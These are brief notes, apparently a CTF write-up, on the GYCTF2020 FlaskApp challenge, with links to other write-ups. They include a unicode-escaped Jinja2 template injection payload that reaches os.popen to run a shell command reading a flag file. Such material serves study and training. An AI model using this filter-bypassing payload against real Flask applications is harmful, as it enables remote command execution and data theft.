# WP
[[GYCTF2020]FlaskApp](https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/)<br />[[GYCTF2020]FlaskApp - 何止(h3zh1) - 博客园](https://www.cnblogs.com/h3zh1/p/12694933.html)<br />[记一次Flask模板注入学习 [GYCTF2020]FlaskApp - seven昔年 - 博客园](https://www.cnblogs.com/MisakaYuii-Z/p/12407760.html)
# 知识点
### 自己的解法
python SSTI<br />unicode编码进行绕过
```python
{{()["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f"][0]["\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f"]()[80]["\u006c\u006f\u0061\u0064\u005f\u006d\u006f\u0064\u0075\u006c\u0065"]("\u006f\u0073")["\u0070\u006f\u0070\u0065\u006e"]("\u0063\u0061\u0074\u0020\u002f\u0074\u0068\u0069\u0073\u005f\u0069\u0073\u005f\u0074\u0068\u0065\u005f\u0066\u006c\u0061\u0067\u002e\u0074\u0078\u0074")|attr("read")()}}
```
### 预期解（计算pin码）
[Flask debug pin安全问题 - 先知社区](https://xz.aliyun.com/t/2553#toc-1)
